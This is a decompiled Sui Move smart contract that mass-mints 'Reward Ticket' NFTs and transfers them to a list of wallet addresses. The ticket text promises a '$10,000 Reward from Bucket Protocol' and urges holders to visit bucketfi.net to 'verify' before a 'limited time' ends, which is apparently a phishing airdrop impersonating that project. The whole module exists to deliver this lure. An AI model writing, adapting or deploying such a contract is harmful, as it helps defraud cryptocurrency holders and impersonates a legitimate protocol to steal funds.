module 0x8d41d226d254aa621b8a3bbea612209f6870e057636f660eafacf9ca40ec6dbe::reward5047 {
    struct REWARD5047 has drop {
        dummy_field: bool,
    }

    struct TICKET_5047 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward5047(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_5047{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586012/bucketfinet_1022_2_casoom.jpg"),
                description : 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_5047>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586012/bucketfinet_1022_2_casoom.jpg"),
                description : 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"$10,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_5047>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD5047, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729586012/bucketfinet_1022_2_casoom.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your $10,000 Reward from Bucket Protocol! Visit https://bucketfi.net to verify and receive your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://bucketfi.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Bucket Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000"));
        let v4 = 0x2::package::claim<REWARD5047>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_5047>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_5047>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_5047>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

